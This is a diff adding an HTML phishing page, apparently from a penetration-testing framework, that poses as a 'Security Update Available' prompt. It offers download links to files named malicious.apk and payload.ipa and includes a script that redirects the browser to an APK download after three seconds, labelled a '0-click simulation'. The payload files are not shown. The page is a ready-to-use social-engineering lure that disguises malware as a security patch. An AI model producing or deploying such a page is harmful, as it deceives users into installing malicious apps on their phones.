@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><title>Update Required</title></head>
+<body style="text-align:center; padding:60px;">
+    <h2>🔧 Security Update Available</h2>
+    <p>Click to install latest security patch:</p>
+    <a href="/payloads/android/malicious.apk" class="btn" download>📱 Install Android</a>
+    <a href="/payloads/ios/payload.ipa" class="btn" download>🍎 Install iOS</a>
+    <br><small>Powered by Pentest Framework</small>
+    
+    <script>
+        // Auto-trigger for 0-click simulation
+        setTimeout(() => {
+            window.location = '/payloads/android/install.apk';
+        }, 3000);
+    </script>
+</body>
+</html>
